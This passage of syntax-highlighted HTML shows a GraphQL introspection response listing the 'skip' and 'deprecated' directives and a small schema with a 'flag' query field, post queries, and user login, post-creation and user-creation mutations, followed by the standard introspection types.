or fragment when the `if` argument is true.&#34;</span><span class="p">,</span><span class="nt">&#34;locations&#34;</span><span class="p">:[</span><span class="s2">&#34;FIELD&#34;</span><span class="p">,</span><span class="s2">&#34;FRAGMENT_SPREAD&#34;</span><span class="p">,</span><span class="s2">&#34;INLINE_FRAGMENT&#34;</span><span class="p">],</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;skip&#34;</span><span class="p">},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="s2">&#34;\&#34;No longer supported\&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Explains why this element was deprecated, usually also including a suggestion for how to access supported similar data. Formattedin [Markdown](https://daringfireball.net/projects/markdown/).&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;reason&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}],</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Marks an element of a GraphQL schema as no longer supported.&#34;</span><span class="p">,</span><span class="nt">&#34;locations&#34;</span><span class="p">:[</span><span class="s2">&#34;FIELD_DEFINITION&#34;</span><span class="p">,</span><span class="s2">&#34;ENUM_VALUE&#34;</span><span class="p">],</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;deprecated&#34;</span><span class="p">}],</span><span class="nt">&#34;mutationType&#34;</span><span class="p">:{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Mutation&#34;</span><span class="p">},</span><span class="nt">&#34;queryType&#34;</span><span class="p">:{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Query&#34;</span><span class="p">},</span><span class="nt">&#34;types&#34;</span><span class="p">:[{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The name of the post&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;post&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Post&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;posts&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Post&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Query&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;password&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;username&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;authenticateUser&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Auth&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;image&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;content&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;createPost&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Post&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;username&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;password&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;createUser&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;User&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Mutation&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;A GraphQL Schema defines the capabilities of a GraphQL server. It exposes all available types and directives on the server, as well as the entry points for query, mutation, and subscription operations.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;A list of all directives supported by this server.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;directives&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Directive&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;If this server supports mutation, the type that mutation operations will be rooted at.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;mutationType&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The type that query operations will be rooted at.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;queryType&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;If this server supports subscription, the type that subscription operations will be rooted at.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;subscriptionType&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;A list of all types supported by this server.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;types&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Schema&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The fundamental unit of any GraphQL Schema is the type. There are many kinds of types in GraphQL as represented by the `__TypeKind` enum.\n\nDepending on the kind of a type, certain fields describe information about that type. Scalar types provide no information beyond a name and description, while Enum types provide their values. Object and Interface types provide the fields they describe. Abstract types, Union and Interface, provide the Object types possible at runtime. List and NonNull types compose other types.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;description&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="s2">&#34;false&#34;</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;includeDeprecated&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;enumValues&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__EnumValue&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="s2">&#34;false&#34;</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;includeDeprecated&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;fields&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Field&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span 